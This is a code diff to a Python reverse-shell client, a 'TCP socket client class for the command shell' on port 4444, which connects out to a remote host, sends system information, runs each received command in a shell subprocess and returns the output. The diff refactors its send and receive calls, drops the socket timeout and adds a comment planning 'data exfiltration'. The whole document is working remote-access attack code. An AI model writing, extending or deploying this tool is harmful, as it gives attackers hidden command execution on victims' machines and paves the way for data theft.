@@ -1,21 +1,23 @@
+# todo: create handling for data exfiltration
 from .nodeutils import (
     os,
     shutil,
     subprocess,
+    struct,
     sys,
     socket,
-    SocketStream,
+    StreamSocket,
     utils
 )
 
 
-class Client(SocketStream):
+class Client(StreamSocket):
     """TCP socket client class for the command shell"""
     def __init__(self, rhost: str, port=4444, buff=1024, verb=False):
         if not (str(port).isdigit() & (1 <= int(port) <= 65535)):
             utils.throw("Expected <port> to be an int less or equal to 65535")
         else:
-            super().__init__(rhost, port, buff, verb)
+            super().__init__(rhost, port, verb)
         self.Shell = None
 
     def spawn_shell(self, op_sys: str = os.name) -> subprocess.Popen:
@@ -36,7 +38,7 @@ class Client(SocketStream):
             [], shell=True,
             executable=shell_exec,
             env=environment,
-            cwd=str(Path.home()),
+            #cwd=str(Path.home()),
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
@@ -52,10 +54,9 @@ class Client(SocketStream):
     def connect(self) -> None:
         """Initiate connection to remote server shell"""
         sock = socket.socket()
-        sock.setblocking(True)
-        sock.settimeout(60)
+        #sock.settimeout(60)
 
-        executable = self.get_executable(os.name)
+        executable = self.get_executable()
 
         try:
             sock.connect((self.Address, self.Port))
@@ -65,40 +66,40 @@ class Client(SocketStream):
             utils.throw(f"Could not establish connection with {self.Address}")
 
         try:
-            establish_msg = sock.recv(self.Buffer).decode()
+            establish_msg = self.receive(sock).decode()
             utils.status(establish_msg)
 
             sysinfo = self.sys_info()
-            sock.sendall(sysinfo.encode())
-            #shell = self.spawn_shell(os.name)
+            self.send(sock, sysinfo)
 
             while True:
-                command = sock.recv(self.Buffer).decode()
+                command = self.receive(sock).decode()
 
                 if self.Verbose:
                     utils.status(command)
 
                 if command.lower() in ["exit", "quit"]:
-                    sock.sendall("Connection will now terminate".encode())
+                    self.send(sock, "Connection will now terminate")
                     break
 
                 #stdout, stderr = shell.communicate(command.split(), timeout=60)
-                raw_output = self.execute(command, executable)
+                output, level = self.execute(command, executable)
 
                 if self.Verbose:
-                    utils.status(raw_output.decode())
+                    utils.status(output.decode(), level)
 
-                sock.sendall(raw_output)
+                self.send(sock, output)
         except Exception as exc:
             self.except_handler(exc)
         finally:
-            if self.Shell is not None:
+            if not (self.Shell is None):
                 if self.Verbose:
                     utils.status(f"Killing shell process {self.Shell.pid}")
-
                 self.Shell.kill()
 
             try:
-                sock.shutdown(socket.socket.SHUT_WR)
+                sock.shutdown(socket.SHUT_WR)
+            except OSError:
+                pass
             finally:
                 sock.close()
